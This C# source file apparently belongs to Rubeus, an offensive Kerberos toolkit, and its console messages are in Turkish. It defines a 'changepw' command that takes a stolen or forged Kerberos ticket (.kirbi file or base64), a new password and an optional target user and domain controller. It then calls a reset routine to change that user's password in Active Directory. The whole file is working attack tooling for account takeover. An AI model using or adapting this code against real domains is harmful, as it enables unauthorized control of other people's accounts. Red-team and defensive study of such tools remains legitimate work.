using System;
using System.Collections.Generic;
using System.IO;


namespace Rubeus.Commands
{
    public class Changepw : ICommand
    {
        public static string CommandName => "changepw";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Eylem: Kullanici Sifresini Sifirla (AoratoPw)\r\n");

            string newPassword = "";
            string dc = "";
            string targetUser = null;

            if (arguments.ContainsKey("/new"))
            {
                newPassword = arguments["/new"];
            }
            if (String.IsNullOrEmpty(newPassword))
            {
                Console.WriteLine("\r\n[X] Yeni sifre /new:X ile saglanmalidir!\r\n");
                return;
            }

            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }

            if (arguments.ContainsKey("/targetuser")) {
                targetUser = arguments["/targetuser"];
            }

            if (arguments.ContainsKey("/ticket"))
            {
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    Reset.UserPassword(kirbi, newPassword, dc, targetUser);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    Reset.UserPassword(kirbi, newPassword, dc, targetUser);
                }
                else
                {
                    Console.WriteLine("\r\n[X]/ticket:X bir .kirbi dosyasi veya base64 kodlu bir .kirbi olmalidir\r\n");
                }
                return;
            }
            else
            {
                Console.WriteLine("\r\n[X] Bir /ticket:X saglanmalidir!\r\n");
                return;
            }
        }
    }
}